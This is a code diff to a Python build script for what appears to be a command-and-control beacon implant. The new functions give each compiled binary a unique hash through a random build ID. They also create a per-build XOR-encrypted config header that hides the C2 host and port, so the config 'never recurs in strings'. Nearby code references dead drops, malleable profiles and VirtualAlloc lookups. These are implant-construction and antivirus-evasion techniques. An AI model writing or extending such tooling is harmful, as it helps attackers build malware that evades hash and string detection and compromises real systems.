@@ -134,6 +134,65 @@ def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
         return None
 
 
+# The tracked template of the generated per-build XOR-config header. It lives
+# with the shipping payload (the header is a project asset); `beacon_dir` is
+# only the tree the generated header is written INTO, which is what lets a
+# test build a throwaway tree.
+_CONFIG_HEADER = "config_encrypted.h"
+_CONFIG_TEMPLATE = os.path.normpath(os.path.join(
+    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+    "payloads", "beacon", "src", "config_encrypted.h.in"))
+
+
+def write_build_id(beacon_dir: str) -> str:
+    """Write a fresh ``build_id.h`` so every build has a unique binary hash.
+
+    Extracted from ``compile_beacon`` so that `scripts/ci_beacon_prepare.py`
+    writes the SAME header the build does: ``main.cpp`` includes it, a fresh
+    checkout has neither, and a stub written only in CI would not be the header
+    the build actually compiles against.
+    """
+    import uuid
+
+    path = os.path.join(beacon_dir, "src", "build_id.h")
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
+    return path
+
+
+def write_config_encrypted(beacon_dir: str, seed: Optional[int] = None) -> str:
+    """Create ``config_encrypted.h`` from its tracked template.
+
+    The header is PER BUILD (a fresh CONFIG_SEED per binary: one seed shared by
+    every build means the XOR keystream hiding C2_HOST/PORT is shared too) and
+    therefore untracked — but nothing ever CREATED it. `_write_config_seed`
+    only rewrites the seed of an EXISTING file, so it worked on machines that
+    still had the header left over from before it was ignored, and a fresh
+    clone failed at ``#include "config_encrypted.h"`` in main.cpp. That is the
+    beacon-syntax job and every beacon-smoke job: they compile the real
+    translation unit on a clean tree.
+
+    An EXISTING header is left alone: `_write_config_seed` rotates it per build
+    and a build must never throw away a header it was handed.
+    """
+    src_dir = os.path.join(beacon_dir, "src")
+    os.makedirs(src_dir, exist_ok=True)
+    path = os.path.join(src_dir, _CONFIG_HEADER)
+    if os.path.exists(path):
+        return path
+    with open(_CONFIG_TEMPLATE, "r", encoding="utf-8") as handle:
+        content = handle.read()
+    value = secrets.randbits(64) if seed is None else int(seed)
+    content = re.sub(r"@CONFIG_SEED@", f"{value:016X}", content, count=1)
+    if re.search(r"@[A-Z_]+@", content):
+        # a template placeholder nothing substitutes would ship as invalid C++
+        raise ValueError(f"{_CONFIG_TEMPLATE}: unsubstituted placeholder")
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
+    return path
+
+
 def _write_config_seed(beacon_dir: str) -> str:
     """Rotate the compile-time XOR seed in ``config_encrypted.h`` per build.
 
@@ -238,10 +297,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
         return beacon_out
 
     # Generate dynamic build ID to ensure unique binary hash
-    import uuid
-    build_id_path = os.path.join(beacon_dir, "src", "build_id.h")
-    with open(build_id_path, "w") as f:
-        f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
+    write_build_id(beacon_dir)
 
     # Enroll a unique identity for every explicit build. The private secret
     # is written only to the generated header and the operator registry.
@@ -330,6 +386,9 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                            dead_drop=dead_drop or "",
                            bootstrap_dead_drop=bootstrap_dd)
     write_malleable_config(beacon_dir, profile_path=malleable_profile)
+    # Materialise the XOR-config header on a tree that has never built, then
+    # rotate its seed: the two together give every build its own keystream.
+    write_config_encrypted(beacon_dir)
     # Fresh XOR keystream per build so the C2 config never recurs in strings.
     _write_config_seed(beacon_dir)
 
